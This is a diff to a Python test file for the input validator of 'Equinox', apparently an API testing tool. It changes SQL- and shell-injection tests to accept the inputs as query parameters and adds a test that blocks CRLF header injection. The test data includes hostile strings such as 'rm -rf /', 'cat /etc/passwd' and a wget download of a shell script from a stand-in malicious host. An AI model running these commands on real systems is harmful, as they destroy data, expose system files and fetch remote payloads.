@@ -24,22 +24,24 @@ class TestInjectionAttackPrevention:
         assert result is not None
 
     def test_sql_drop_table_injection(self):
-        """Test SQL DROP TABLE injection prevention."""
+        """Test SQL DROP TABLE in query params — harmless (sent to remote server)."""
         dangerous_input = "'); DROP TABLE users;--"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"id": dangerous_input})
+        # Equinox uses parameterized queries internally; query params are
+        # user-controlled data sent to a remote API, so they are allowed.
+        result = Validator.validate_query_params({"id": dangerous_input})
+        assert result is not None
 
     def test_sql_insert_injection(self):
-        """Test SQL INSERT injection prevention."""
+        """Test SQL INSERT in query params — harmless (sent to remote server)."""
         dangerous_input = "1; INSERT INTO admin VALUES ('hacker', 'pass')--"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"id": dangerous_input})
+        result = Validator.validate_query_params({"id": dangerous_input})
+        assert result is not None
 
     def test_sql_delete_injection(self):
-        """Test SQL DELETE injection prevention."""
+        """Test SQL DELETE in query params — harmless (sent to remote server)."""
         dangerous_input = "1; DELETE FROM users WHERE 1=1--"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"id": dangerous_input})
+        result = Validator.validate_query_params({"id": dangerous_input})
+        assert result is not None
 
     def test_sql_comment_injection(self):
         """Test SQL comment-based injection."""
@@ -56,34 +58,44 @@ class TestInjectionAttackPrevention:
         assert result is not None
 
     def test_command_injection_semicolon(self):
-        """Test command injection with semicolon."""
+        """Test that semicolons are allowed in query params (legitimate URL chars)."""
         dangerous_input = "test; rm -rf /"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"cmd": dangerous_input})
+        # Shell metacharacters are allowed — Equinox is an API testing tool
+        # and these chars are common in query parameter values.
+        result = Validator.validate_query_params({"cmd": dangerous_input})
+        assert result is not None
 
     def test_command_injection_pipe(self):
-        """Test command injection with pipe."""
+        """Test that pipes are allowed in query params (legitimate URL chars)."""
         dangerous_input = "test | cat /etc/passwd"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"cmd": dangerous_input})
+        result = Validator.validate_query_params({"cmd": dangerous_input})
+        assert result is not None
 
     def test_command_injection_ampersand(self):
-        """Test command injection with ampersand."""
+        """Test that ampersands are allowed in query params (they're query separators)."""
         dangerous_input = "test & wget malicious.com/shell.sh"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"cmd": dangerous_input})
+        result = Validator.validate_query_params({"cmd": dangerous_input})
+        assert result is not None
 
     def test_command_injection_backticks(self):
-        """Test command injection with backticks."""
+        """Test that backticks are allowed in query params."""
         dangerous_input = "test`whoami`"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"cmd": dangerous_input})
+        result = Validator.validate_query_params({"cmd": dangerous_input})
+        assert result is not None
 
     def test_command_injection_dollar_paren(self):
-        """Test command injection with $()."""
+        """Test that $() is allowed in query params."""
         dangerous_input = "test$(cat /etc/passwd)"
-        with pytest.raises(ValidationError):
-            Validator.validate_query_params({"cmd": dangerous_input})
+        result = Validator.validate_query_params({"cmd": dangerous_input})
+        assert result is not None
+
+    def test_crlf_injection_in_query_params(self):
+        """Test that CRLF in query params is blocked (header injection risk)."""
+        with pytest.raises(ValidationError, match="CRLF"):
+            Validator.validate_query_params({"key": "value\r\nX-Evil: injected"})
+
+        with pytest.raises(ValidationError, match="CRLF"):
+            Validator.validate_query_params({"\r\nX-Evil": "value"})
 
     def test_crlf_injection_in_header(self):
         """Test CRLF injection in header value."""
